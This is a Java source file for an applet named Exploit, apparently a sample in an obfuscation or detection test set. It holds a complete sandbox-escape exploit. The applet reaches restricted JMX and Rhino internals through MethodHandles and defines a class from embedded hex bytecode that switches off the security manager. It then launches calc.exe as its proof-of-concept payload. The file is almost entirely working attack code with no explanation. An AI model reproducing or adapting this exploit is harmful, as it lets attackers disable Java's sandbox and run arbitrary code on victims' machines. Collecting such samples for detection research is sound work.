package obfuscate;


public class Exploit extends java.applet.Applet {
    private static final long serialVersionUID = 1L;

    public static byte[] hex2Byte(java.lang.String inputString) {
        byte[] byteArray = new byte[(inputString.length()) / 2];
        for (int i = 0 ; i < (byteArray.length) ; i++) {
            byteArray[i] = ((byte)(java.lang.Integer.parseInt(inputString.substring((2 * i), ((2 * i) + 2)), 16)));
        }
        return byteArray;
    }

    public static byte[] classBBytes = obfuscate.Exploit.hex2Byte("CAFEBABE0000003200270A000500180A0019001A07001B0A001C001D07001E07001F0700200100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010001650100154C6A6176612F6C616E672F457863657074696F6E3B010004746869730100034C423B01000D537461636B4D61705461626C6507001F07001B01000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F7572636546696C65010006422E6A6176610C000800090700210C002200230100136A6176612F6C616E672F457863657074696F6E0700240C002500260100106A6176612F6C616E672F4F626A656374010001420100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284C6A6176612F6C616E672F53656375726974794D616E616765723B295600210006000500010007000000020001000800090001000A0000006C000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030003000B000000120004000000080004000B0009000C000D000D000C000000160002000D0000000D000E00010000000E000F001000000011000000100002FF000C00010700120001070013000001001400150001000A0000003A000200010000000C01B80004BB000559B70001B000000002000B0000000A00020000001000040011000C0000000C00010000000C000F0010000000010016000000020017");

    @java.lang.SuppressWarnings(value = "rawtypes")
    @java.lang.Override
    public void init() {
        try {
            java.lang.ClassLoader nullClassLoader = null;
            java.lang.Object[] noArgs = new java.lang.Object[]{  };
            java.lang.invoke.MethodHandles.Lookup lookup = java.lang.invoke.MethodHandles.publicLookup();
            com.sun.jmx.mbeanserver.MBeanInstantiator beanInstantiator = ((com.sun.jmx.mbeanserver.JmxMBeanServer)(new com.sun.jmx.mbeanserver.JmxMBeanServerBuilder().newMBeanServer("", null, null))).getMBeanInstantiator();
            java.lang.invoke.MethodType methodHandleClassStringMethodType = java.lang.invoke.MethodType.methodType(java.lang.invoke.MethodHandle.class, java.lang.Class.class, new java.lang.Class[]{ java.lang.String.class , java.lang.invoke.MethodType.class });
            java.lang.invoke.MethodHandle findVirtualMethodHandle = lookup.findVirtual(java.lang.invoke.MethodHandles.Lookup.class, "findVirtual", methodHandleClassStringMethodType);
            java.lang.invoke.MethodType methodHandleClassMethodType = java.lang.invoke.MethodType.methodType(java.lang.invoke.MethodHandle.class, java.lang.Class.class, new java.lang.Class[]{ java.lang.invoke.MethodType.class });
            java.lang.invoke.MethodHandle lookupFindConstructorMethodHandle = lookup.findVirtual(java.lang.invoke.MethodHandles.Lookup.class, "findConstructor", methodHandleClassMethodType);
            java.lang.Class generatedClassLoaderClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.GeneratedClassLoader", nullClassLoader);
            java.lang.Class contextClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", nullClassLoader);
            java.lang.invoke.MethodType voidMethodType = java.lang.invoke.MethodType.methodType(java.lang.Void.TYPE);
            java.lang.invoke.MethodHandle contextContext = ((java.lang.invoke.MethodHandle)(lookupFindConstructorMethodHandle.invokeWithArguments(new java.lang.Object[]{ lookup , contextClass , voidMethodType })));
            java.lang.Object jsContext = contextContext.invokeWithArguments(noArgs);
            java.lang.invoke.MethodType generatedClassLoaderMethodType = java.lang.invoke.MethodType.methodType(generatedClassLoaderClass, java.lang.ClassLoader.class);
            java.lang.invoke.MethodHandle createClassLoaderMethodHandle = ((java.lang.invoke.MethodHandle)(findVirtualMethodHandle.invokeWithArguments(new java.lang.Object[]{ lookup , contextClass , "createClassLoader" , generatedClassLoaderMethodType })));
            java.lang.Object generatedClassLoader = createClassLoaderMethodHandle.invokeWithArguments(new java.lang.Object[]{ jsContext , null });
            java.lang.invoke.MethodType stringByteArrayMethodType = java.lang.invoke.MethodType.methodType(java.lang.Class.class, java.lang.String.class, new java.lang.Class[]{ byte[].class });
            java.lang.invoke.MethodHandle defineClassMethodHandle = ((java.lang.invoke.MethodHandle)(findVirtualMethodHandle.invokeWithArguments(new java.lang.Object[]{ lookup , generatedClassLoaderClass , "defineClass" , stringByteArrayMethodType })));
            java.lang.Class classBInstance = ((java.lang.Class)(defineClassMethodHandle.invokeWithArguments(new java.lang.Object[]{ generatedClassLoader , null , obfuscate.Exploit.classBBytes })));
            classBInstance.newInstance();
            java.lang.Runtime.getRuntime().exec("calc.exe");
        } catch (java.lang.Throwable e) {
            e.printStackTrace();
        }
    }
}

